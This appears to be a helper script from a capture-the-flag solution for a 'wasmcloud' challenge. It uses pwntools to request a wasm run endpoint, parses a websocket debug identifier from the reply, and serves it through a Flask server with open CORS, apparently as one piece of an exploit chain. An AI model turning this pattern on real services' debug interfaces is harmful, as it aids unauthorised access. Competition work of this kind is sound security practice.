# On request, serves a valid websocket debug URL
# Replace the wasm link with the actual one

from flask import Flask
import requests
from pwn import *
from flask_cors import CORS, cross_origin
app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

def make_r():
    r = remote("wasmcloud.chal.uiuc.tf", 80)
    r.sendline(b"GET /run/your-wasm-hash.wasm HTTP/1.1\r\n")
    uuid = r.recv(1024).decode().split(" ")[-4].split("\n")[0]
    # Im lazy
    return uuid

@app.route("/")
@cross_origin()
def hello_world():
    return make_r()

app.run(port=8080)
